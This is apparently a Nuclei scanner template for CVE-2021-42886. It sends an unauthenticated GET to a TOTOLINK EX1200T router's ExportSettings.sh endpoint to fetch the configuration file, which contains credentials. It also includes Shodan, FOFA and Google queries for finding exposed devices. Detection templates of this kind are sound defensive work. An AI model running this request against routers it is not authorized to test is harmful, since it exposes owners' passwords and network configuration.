id: CVE-2021-42886

info:
  name: TOTOLINK EX1200T Configuration File Disclosure
  author: ProjectDiscoveryAI
  severity: high
  description: TOTOLINK EX1200T V4.1.2cu.5215 contains an information disclosure vulnerability where an attacker can get the apmib configuration file without authorization, and usernames and passwords can be found in the decoded file.
  impact: |
    An attacker can access sensitive information such as passwords and network configurations.
  remediation: |
    Update the router firmware to the latest version to patch the vulnerability.
  reference:
    - https://github.com/p1Kk/vuln/blob/main/totolink_ex1200t_exportsettings_leak.md
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2021-42886
    cwe-id: CWE-200
    epss-score: 0.00189
    epss-percentile: 0.5748
    cpe: cpe:2.3:o:totolink:ex1200t_firmware:4.1.2cu.5215:*:*:*:*:*:*:*
  metadata:
    vendor: totolink
    product: ex1200t_firmware
    shodan-query: title:"TOTOLINK"
    fofa-query: title="totolink"
    google-query: intitle:"totolink"

http:
  - method: GET
    path:
      - "/cgi-bin/ExportSettings.sh"

    headers:
      Content-Length: "0"
      Cache-Control: "max-age=0"
      Upgrade-Insecure-Requests: "1"
      Origin: "http://192.168.0.1"
      Content-Type: "application/x-www-form-urlencoded"
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"
      Accept-Encoding: "gzip, deflate"
      Accept-Language: "zh-CN,zh;q=0.9,zh-TW;q=0.8"
      Connection: "close"
    matchers:
      - type: word
        words:
          - "Config-EX1200T-"
        part: body
